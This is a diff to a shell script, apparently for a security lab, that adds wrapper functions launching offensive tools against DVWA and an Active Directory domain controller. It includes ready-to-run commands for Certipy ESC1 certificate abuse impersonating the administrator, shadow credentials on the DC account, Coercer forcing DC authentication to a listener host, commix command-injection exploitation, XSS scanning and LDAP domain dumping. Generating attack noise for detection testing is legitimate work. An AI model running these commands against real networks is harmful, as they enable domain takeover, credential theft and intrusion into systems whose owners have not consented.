@@ -665,6 +665,155 @@ cme_pass_the_hash() {
 }
 
 #=============================================================================
+# NEW TOOLS - Certipy, ffuf, feroxbuster, dalfox, commix, coercer
+#=============================================================================
+
+certipy_find() {
+    local target="${1:-$AD_DC_IP}"
+    local domain="${2:-$AD_DOMAIN}"
+    local user="${3:-administrator}"
+    local pass="${4:-password}"
+    echo "[NOISE] Certipy AD CS enumeration: $target"
+    certipy-ad find -u "$user@$domain" -p "$pass" -dc-ip "$target" \
+        -vulnerable -stdout 2>&1 || true
+}
+
+certipy_esc1() {
+    local target="${1:-$AD_DC_IP}"
+    local domain="${2:-$AD_DOMAIN}"
+    local user="${3:-administrator}"
+    local pass="${4:-password}"
+    echo "[NOISE] Certipy ESC1 attack attempt: $target"
+    # Request certificate with SAN
+    certipy-ad req -u "$user@$domain" -p "$pass" -dc-ip "$target" \
+        -ca "lab-DC01-CA" -template "User" -upn "administrator@$domain" 2>&1 || true
+}
+
+certipy_shadow() {
+    local target="${1:-$AD_DC_IP}"
+    local domain="${2:-$AD_DOMAIN}"
+    local user="${3:-administrator}"
+    local pass="${4:-password}"
+    echo "[NOISE] Certipy shadow credentials: $target"
+    certipy-ad shadow auto -u "$user@$domain" -p "$pass" -dc-ip "$target" \
+        -account "DC01$" 2>&1 || true
+}
+
+ffuf_vhost() {
+    local target="${1:-$DVWA_IP}"
+    echo "[NOISE] ffuf virtual host fuzzing: $target"
+    ffuf -u "http://$target/" -H "Host: FUZZ.$target" \
+        -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+        -mc 200,301,302,403 -t 50 -o "$RESULTS/ffuf_vhost_$(date +%s).json" 2>&1 || true
+}
+
+ffuf_dirs() {
+    local target="${1:-http://$DVWA_IP}"
+    echo "[NOISE] ffuf directory fuzzing: $target"
+    ffuf -u "$target/FUZZ" \
+        -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+        -mc 200,301,302,403 -t 100 -o "$RESULTS/ffuf_dirs_$(date +%s).json" 2>&1 || true
+}
+
+ffuf_params() {
+    local target="${1:-http://$DVWA_IP/vulnerabilities/sqli/}"
+    echo "[NOISE] ffuf parameter fuzzing: $target"
+    ffuf -u "$target?FUZZ=test" \
+        -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+        -mc 200 -t 50 -o "$RESULTS/ffuf_params_$(date +%s).json" 2>&1 || true
+}
+
+feroxbuster_recursive() {
+    local target="${1:-http://$DVWA_IP}"
+    echo "[NOISE] feroxbuster recursive scan: $target"
+    feroxbuster -u "$target" \
+        -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+        --depth 4 --threads 100 --no-state \
+        -o "$RESULTS/ferox_$(date +%s).txt" 2>&1 || true
+}
+
+dalfox_scan() {
+    local target="${1:-http://$DVWA_IP/vulnerabilities/xss_r/?name=test}"
+    echo "[NOISE] dalfox XSS scan: $target"
+    dalfox url "$target" \
+        --cookie "security=low; PHPSESSID=test" \
+        --silence --no-color \
+        -o "$RESULTS/dalfox_$(date +%s).txt" 2>&1 || true
+}
+
+dalfox_pipe() {
+    local target="${1:-$DVWA_IP}"
+    echo "[NOISE] dalfox piped XSS scan: $target"
+    # Scan multiple endpoints
+    echo "http://$target/vulnerabilities/xss_r/?name=test
+http://$target/vulnerabilities/xss_s/?txtName=test
+http://$target/vulnerabilities/sqli/?id=1" | \
+    dalfox pipe --cookie "security=low; PHPSESSID=test" \
+        --silence --no-color 2>&1 || true
+}
+
+commix_scan() {
+    local target="${1:-http://$DVWA_IP/vulnerabilities/exec/}"
+    echo "[NOISE] commix command injection scan: $target"
+    commix -u "$target" \
+        --data="ip=127.0.0.1&Submit=Submit" \
+        --cookie="security=low; PHPSESSID=test" \
+        --batch --all \
+        --output-dir="$RESULTS" 2>&1 || true
+}
+
+coercer_scan() {
+    local target="${1:-$AD_DC_IP}"
+    local user="${2:-administrator}"
+    local pass="${3:-password}"
+    local domain="${4:-$AD_DOMAIN}"
+    echo "[NOISE] Coercer authentication coercion scan: $target"
+    coercer scan -u "$user" -p "$pass" -d "$domain" -t "$target" \
+        --listener 10.10.20.20 2>&1 || true
+}
+
+coercer_coerce() {
+    local target="${1:-$AD_DC_IP}"
+    local listener="${2:-10.10.20.20}"
+    local user="${3:-administrator}"
+    local pass="${4:-password}"
+    local domain="${5:-$AD_DOMAIN}"
+    echo "[NOISE] Coercer authentication coercion: $target -> $listener"
+    coercer coerce -u "$user" -p "$pass" -d "$domain" -t "$target" \
+        --listener "$listener" --all-methods 2>&1 || true
+}
+
+httpx_probe() {
+    local target="${1:-$TARGET_SUBNET}"
+    echo "[NOISE] httpx HTTP probing: $target"
+    echo "$target" | httpx -silent -ports 80,443,8080,8443,3000,8000,8888 \
+        -title -status-code -tech-detect -follow-redirects \
+        -o "$RESULTS/httpx_$(date +%s).txt" 2>&1 || true
+}
+
+httpx_targets() {
+    echo "[NOISE] httpx all targets probe"
+    echo "10.10.40.10
+10.10.40.20
+10.10.40.21
+10.10.40.30
+10.10.40.31
+10.10.40.32" | httpx -silent -ports 80,443,8080,8443,3000,8000,8180,8020 \
+        -title -status-code -tech-detect -follow-redirects \
+        -o "$RESULTS/httpx_targets_$(date +%s).txt" 2>&1 || true
+}
+
+ldapdomaindump_full() {
+    local target="${1:-$AD_DC_IP}"
+    local user="${2:-administrator}"
+    local pass="${3:-password}"
+    local domain="${4:-$AD_DOMAIN}"
+    echo "[NOISE] ldapdomaindump full enumeration: $target"
+    ldapdomaindump -u "$domain\\$user" -p "$pass" ldap://"$target" \
+        -o "$RESULTS/ldapdump_$(date +%s)" 2>&1 || true
+}
+
+#=============================================================================
 # MAIN - Allow direct invocation
 #=============================================================================
 
